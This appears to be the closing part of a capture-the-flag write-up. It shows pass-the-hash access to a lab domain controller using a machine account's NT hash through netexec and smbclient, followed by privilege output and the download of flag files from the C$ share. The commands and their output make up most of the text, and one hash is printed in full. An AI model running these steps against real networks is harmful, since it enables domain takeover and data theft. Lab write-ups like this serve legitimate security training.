# Logged in as FileServer$, we took over this computer.

```
nxc smb DC01 -u 'FileServer$' -H <SNIP> -x 'whoami /all'
SMB         10.201.90.139   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.90.139   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.201.90.139   445    DC01             [+] Executed command via wmiexec
SMB         10.201.90.139   445    DC01             USER INFORMATION
SMB         10.201.90.139   445    DC01             ----------------
SMB         10.201.90.139   445    DC01             User Name               SID
SMB         10.201.90.139   445    DC01             ======================= ============================================
SMB         10.201.90.139   445    DC01             soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065
SMB         10.201.90.139   445    DC01             GROUP INFORMATION
SMB         10.201.90.139   445    DC01             -----------------
SMB         10.201.90.139   445    DC01             Group Name                                         Type             SID                                         Attributes
SMB         10.201.90.139   445    DC01             ================================================== ================ =========================================== ===============================================================                                                                                                                                                                                                 
SMB         10.201.90.139   445    DC01             SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner                                                                                                                                                                                                 
SMB         10.201.90.139   445    DC01             NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group                                                                                                                                                                                                 
SMB         10.201.90.139   445    DC01             NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                              
SMB         10.201.90.139   445    DC01             Mandatory Label\High Mandatory Level               Label            S-1-16-12288
SMB         10.201.90.139   445    DC01             PRIVILEGES INFORMATION
SMB         10.201.90.139   445    DC01             ----------------------
SMB         10.201.90.139   445    DC01             Privilege Name                            Description                                                        State
SMB         10.201.90.139   445    DC01             ========================================= ================================================================== =======
SMB         10.201.90.139   445    DC01             SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         10.201.90.139   445    DC01             SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SMB         10.201.90.139   445    DC01             SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         10.201.90.139   445    DC01             SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         10.201.90.139   445    DC01             SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         10.201.90.139   445    DC01             SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         10.201.90.139   445    DC01             SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         10.201.90.139   445    DC01             SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         10.201.90.139   445    DC01             SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         10.201.90.139   445    DC01             SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         10.201.90.139   445    DC01             SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         10.201.90.139   445    DC01             SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         10.201.90.139   445    DC01             SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         10.201.90.139   445    DC01             SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         10.201.90.139   445    DC01             SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         10.201.90.139   445    DC01             SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         10.201.90.139   445    DC01             SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         10.201.90.139   445    DC01             SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         10.201.90.139   445    DC01             SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SMB         10.201.90.139   445    DC01             SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         10.201.90.139   445    DC01             SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         10.201.90.139   445    DC01             SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         10.201.90.139   445    DC01             SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         10.201.90.139   445    DC01             SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         10.201.90.139   445    DC01             SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         10.201.90.139   445    DC01             SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         10.201.90.139   445    DC01             USER CLAIMS INFORMATION
SMB         10.201.90.139   445    DC01             -----------------------
SMB         10.201.90.139   445    DC01             User claims unknown.
SMB         10.201.90.139   445    DC01             Kerberos support for Dynamic Access Control on this device has been disabled.
```


```
smbclient \\\\DC01\\C$ -U FileServer$%<SNIP> --pw-nt-hash
Try "help" to get a list of possible commands.
smb: \> dir
  $WinREAgent                        DH        0  Sat Jun 15 15:19:51 2024
  Documents and Settings          DHSrn        0  Sat Jun 15 22:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Thu Aug 14 09:18:39 2025
  pagefile.sys                      AHS 738197504  Thu Aug 14 09:18:39 2025
  PerfLogs                            D        0  Sat May  8 04:15:05 2021
  Program Files                      DR        0  Sat Jun 15 13:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 05:34:13 2021
  ProgramData                       DHn        0  Thu Aug  1 09:57:43 2024
  Recovery                         DHSn        0  Sat Jun 15 22:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 15:02:21 2024
  Users                              DR        0  Thu Jul  4 18:48:22 2024
  Windows                             D        0  Fri Jul 25 13:50:36 2025
```

smb: \> get users\administrator\desktop\root.txt
smb: \> get users\ybob317\desktop\user.txt
